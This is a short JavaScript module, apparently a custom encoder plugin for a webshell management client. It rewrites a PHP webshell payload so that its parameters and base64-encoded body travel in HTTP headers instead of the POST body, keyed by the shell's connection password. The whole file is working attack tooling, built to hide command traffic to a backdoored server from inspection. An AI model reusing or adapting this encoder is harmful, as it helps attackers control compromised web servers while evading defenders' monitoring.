/**
 * php::header 传参处理器
 */
 
'use strict';
 
/*
* @param  {String} pwd   连接密码
* @param  {Array}  data  编码器处理前的 payload 数组
* @return {Array}  data  编码器处理后的 payload 数组
*/
module.exports = (pwd, data, ext={}) => {
 
  for (let _ in data){
    if( _ === '_') { continue;}
   
    if(data[_].length < 10000){
 
      while(data['_'].indexOf(_)!=-1){
        // 多次替换掉payload里的$_POST传参
        data['_'] = data['_'].replace('$_POST["'+ _ +'"]','$_SERVER["HTTP_'+_.toUpperCase()+'"]');
      }
      ext.opts.httpConf.headers[_] = data[_];
      delete data[_];
    }
  }
  //console.log(data['_']);
  ext.opts.httpConf.headers[pwd] = new Buffer.from(data['_']).toString('base64');
 
//   if(Object.keys(data).length === 1 ){
//     console.log("此时 无POST传参");
//     data['time'] = (new Date()).getTime();
//   }
 
  delete data['_'];
 
  return data;
}